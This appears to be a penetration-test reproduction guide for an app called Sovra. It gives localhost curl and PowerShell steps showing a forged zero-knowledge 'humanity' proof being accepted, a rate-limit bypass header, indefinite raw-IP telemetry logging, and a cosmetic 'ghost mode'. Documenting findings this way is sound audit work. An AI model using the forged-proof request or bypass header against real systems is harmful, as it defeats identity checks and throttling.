# SOVRA — STEP-BY-STEP ADVERSARIAL REPRODUCTION GUIDE

**Audit Date**: 2026-11-04  
**Audit Entity**: Multidisciplinary Enterprise Technology Audit Organization  
**Auditor Roles**: QA Automation Engineer & Backend Penetration Tester  
**Scope**: Reproduction procedures for all identified findings (SEC-01 through SEC-07)

---

## 1. REPRODUCING FINDING SEC-01: ZK-SNARK CIRCUIT BYPASS

### Prerequisites:
Running Sovra edge node on `http://127.0.0.1:3001`.

### Step 1: Register a Temporary Test Account
```bash
curl -s -X POST http://127.0.0.1:3001/api/user/register \
  -H "Content-Type: application/json" \
  -d '{"displayName": "ZkExploiter", "handle": "zk_exploit_test"}'
```
*Note the returned `"token"` field.*

### Step 2: Submit a Fabricated Dummy Proof
```bash
curl -s -X POST http://127.0.0.1:3001/api/zk/humanity/verify \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{
    "proof": { "pi_a": ["0x00"], "pi_b": [["0x00"]], "pi_c": ["0x00"] },
    "publicSignals": ["0xdeadbeef"],
    "nullifierHash": "nullifier_forgery_repro_123"
  }'
```

### Observed Vulnerable Response:
```json
{ "ok": true, "verified": true }
```
*Vulnerability Confirmed*: Server accepted completely bogus proof points without error.

---

## 2. REPRODUCING FINDING SEC-05: RATE LIMITER BYPASS HEADER

### Step 1: Test Throttling Without Bypass Header
Send 30 rapid GET requests to a throttled endpoint:
```powershell
for ($i=0; $i -lt 30; $i++) {
  curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3001/api/watch/videos
}
```
*Observed*: Initial requests return `200`, followed by `429 Too Many Requests`.

### Step 2: Test With Bypass Header
Send 30 rapid GET requests with `x-sovra-benchmark: true`:
```powershell
for ($i=0; $i -lt 30; $i++) {
  curl -s -o /dev/null -w "%{http_code}\n" -H "x-sovra-benchmark: true" http://127.0.0.1:3001/api/watch/videos
}
```
*Observed*: All 30 requests return `200 OK`. Rate limiting is completely disabled.

---

## 3. REPRODUCING FINDING SEC-06: UNBOUNDED WIRETAP LOGGING

### Step 1: Query Current Telemetry Record Count
```powershell
node -e "const { DatabaseSync } = require('node:sqlite'); const db = new DatabaseSync('.sovra-storage-dev/sovra-social.sqlite'); console.log('Current rows:', db.prepare('SELECT count(*) as c FROM admin_wiretap_telemetry').get());"
```

### Step 2: Issue 5 Arbitrary HTTP Requests
```powershell
for ($i=0; $i -lt 5; $i++) {
  curl -s http://127.0.0.1:3001/api/status > $null
}
```

### Step 3: Verify Telemetry Row Incrementation
```powershell
node -e "const { DatabaseSync } = require('node:sqlite'); const db = new DatabaseSync('.sovra-storage-dev/sovra-social.sqlite'); console.log('New rows:', db.prepare('SELECT count(*) as c FROM admin_wiretap_telemetry').get());"
```
*Observed*: Count incremented by exactly 5. Records persist indefinitely with raw IP address.

---

## 4. REPRODUCING FINDING SEC-04: GHOST MODE REAL IP LEAK

### Step 1: Inspect Client Code
Open `scripts/dev-server.ts` at line 47245.
Observe that `toggleGhostMode()` only sets `localStorage.setItem('sovra_ghost_mode', !isGhost)` and toggles CSS class `ghost-theme`.

### Step 2: Observe Server Log Under Ghost Mode
Make any API request while Ghost Mode is active in the browser. Query `admin_wiretap_telemetry`.
The user's real remote IP address is recorded identically to normal requests. Zero network-level anonymity is provided.
